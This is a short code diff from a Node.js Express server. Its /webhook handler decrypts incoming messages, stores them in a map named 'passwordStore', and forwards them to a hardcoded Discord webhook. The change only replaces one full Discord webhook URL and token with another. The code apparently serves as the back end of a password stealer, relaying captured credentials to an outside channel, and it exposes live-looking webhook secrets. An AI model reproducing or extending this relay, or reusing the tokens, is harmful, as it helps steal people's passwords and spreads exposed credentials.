@@ -49,7 +49,7 @@ app.post("/webhook", async (req, res) => {
         passwordStore.set(decryptedMessage, Date.now());
 
         const webhookData = { content: decryptedMessage };
-        const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";
+        const webhookUrl = "https://discord.com/api/webhooks/1340602904138088530/emCGUboojJTRp46yy-Xa6VuiHCn_0Y6DRvdoFBO2XDsyCMmeN6-wQDVGxCqu4G9egy7I";
 
         // Try to send the webhook, handle rate limits
         let webhookResponse = await fetch(webhookUrl, {
